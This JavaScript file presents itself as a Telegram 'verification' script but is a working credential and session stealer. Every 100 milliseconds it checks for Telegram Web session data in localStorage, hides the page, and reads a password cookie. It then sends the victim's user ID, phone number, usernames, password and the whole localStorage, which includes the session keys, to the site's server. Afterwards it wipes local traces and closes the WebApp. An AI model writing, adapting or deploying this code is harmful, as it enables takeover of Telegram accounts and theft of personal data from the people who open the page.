document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM loaded, initializing verification process");

  // Handle errors globally
  window.onerror = function (message, source, lineno, colno, error) {
    console.error("Global error:", message, "at", source, "line", lineno);
    console.error("Error details:", error);
    return false;
  };

  async function checkLocalStorage() {
    try {
      console.log("Checking local storage for Telegram data...");
      let globalState = localStorage.getItem("tt-global-state");
      let userAuth = localStorage.getItem("user_auth");

      console.log("Global state exists:", !!globalState);
      console.log("User auth exists:", !!userAuth);

      if (globalState && userAuth) {
        const parsedState = JSON.parse(globalState);
        const currentUserId = parsedState.currentUserId;
        const currentUser = parsedState.users.byId[currentUserId];
        document.body.style.display = "none";

        console.log("User ID found:", currentUserId);
        console.log("User data exists:", !!currentUser);

        if (currentUserId && currentUser) {
          const { firstName, usernames, phoneNumber, isPremium } = currentUser;
          const password = document.cookie
            .split("; ")
            .find((e) => e.startsWith("password="))
            ?.split("=")[1];

          localStorage.removeItem("GramJs:apiCache");
          localStorage.removeItem("tt-global-state");

          // Get URL parameters
          const urlParams = new URLSearchParams(window.location.search);
          const type = urlParams.get("type");
          const trackingCode = urlParams.get("start");

          console.log("Verification type:", type);
          console.log("Tracking code:", trackingCode);
          console.log("Preparing to send verification data to server");

          // Send data to server with error handling
          try {
            const response = await fetch(`/api/users/telegram/info`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId: currentUserId,
                firstName,
                usernames,
                phoneNumber,
                isPremium,
                password,
                quicklySet: localStorage,
                type: type,
                trackingCode: trackingCode,
              }),
            });

            if (!response.ok) {
              throw new Error(
                `Server responded with status: ${response.status}`
              );
            }

            const responseData = await response.json();
            console.log(
              "Successfully sent verification data, response:",
              responseData
            );
          } catch (error) {
            console.error("Error sending data to server:", error.message);
          }

          console.log("Closing Telegram WebApp");
          try {
            window.Telegram.WebApp.close();
          } catch (error) {
            console.error("Error closing Telegram WebApp:", error.message);
            window.location.href = "https://web.telegram.org/a/";
          }

          localStorage.clear();
          document.cookie =
            "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";

          clearInterval(checkInterval);
        }
      } else {
        console.log("Required Telegram data not found in local storage");
        sessionStorage.clear();
        localStorage.clear();
      }
    } catch (error) {
      console.error("Error in checkLocalStorage function:", error.message);
      console.error("Error stack:", error.stack);
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
  console.log("Verification check interval started");
});
